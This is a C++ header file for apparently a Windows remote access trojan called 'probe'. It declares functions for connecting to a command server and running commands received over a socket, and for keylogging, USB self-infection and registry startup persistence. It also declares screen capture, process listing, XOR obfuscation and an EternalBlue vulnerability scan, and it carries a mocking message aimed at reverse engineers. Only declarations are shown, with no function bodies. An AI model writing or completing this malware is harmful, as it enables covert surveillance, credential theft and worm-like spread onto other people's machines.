#define NOMINMAX

#ifndef PROBE_H
#define PROBE_H

#include "../common/LoadLibraryR.h"

#include <winsock2.h>
#include <wininet.h>
#include <shellapi.h>
#include <stdio.h>
#include <mmsystem.h>
#include <cstring>
#include <sstream>
#include <fstream>
#include <tchar.h>
#include <Psapi.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <windows.h>


#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "winmm.lib")

#define CLIENT_TYPE "cHJvYmVjbA==" // base64 for probecl

#define BUFFER 4096
#define NTSTATUS LONG
#define UNLEN 256
#define MAXKEYLOGSZ 10000 // 10 kb maximum size of keylog, After that it will be cleared
#define MSG "Oh no! Looks like I'm being reversed engineered!" // Random message for reverse engineers.

static BOOL connected = FALSE;
static BOOL online_keylogs = FALSE;




namespace Server {
	void ProbeConnect(void);
	void REConnect(void);
	void StartWSA(void);
	void sockprintf(const char* words, ...);
	void sockSend(const char* data);
	void ExecSock(SOCKET sockfd, char recvbuf[BUFFER]);
	void RHPMain(void);
}

namespace System {
	DWORD WINAPI USBINFECT(LPVOID lpParameter);
	void ListDir();
	BOOL GetUSBThreadStatus();
	void poweroff(int code);
	int CaptureAnImage(HWND hWnd, SOCKET sockfd);
	void TimeStamp(char buffer[100]);
	void OS(void);
	char* cDir();
	std::string MyLocation();
	BOOL isFile(const char* file);
	DWORD ProcessId(LPCTSTR ProcessName);
	char* appDataPath();
	void StartupKey(const char* INSTALL_FOLDER_NAME, const char* czExePath);
	int filesize(const char* filename);
	void SendProcessList();
	void MessageBoxShow();
	BOOL IsAdmin();

	bool hookShift();
	bool capsLock();
	int filter(int key);
	std::string KeylogFileName(int mode);
	std::string WindowStamp();
	void Keylogger();
	DWORD WINAPI KEYLOG_THREAD(LPVOID lpParameter);

	void split(char* src, char* dest[5], const char* delimeter);
	std::string ProcessNameAndID(DWORD processID);
	std::string XOR(std::string data, std::string encrypted_key);
}

namespace LoadInfo {
	std::istream& ignoreline(std::ifstream& in, std::ifstream::pos_type& pos);
	std::string GetServerInfo();
	std::string getLastLine(std::ifstream& in);
}


namespace Network {
	const char* IP2Host(const char* IP);
	void CheckHost(const char* ip_address);
	void checkPort(const char* ip, int port);
	void EternalBlueScan(const char* host);
}



#endif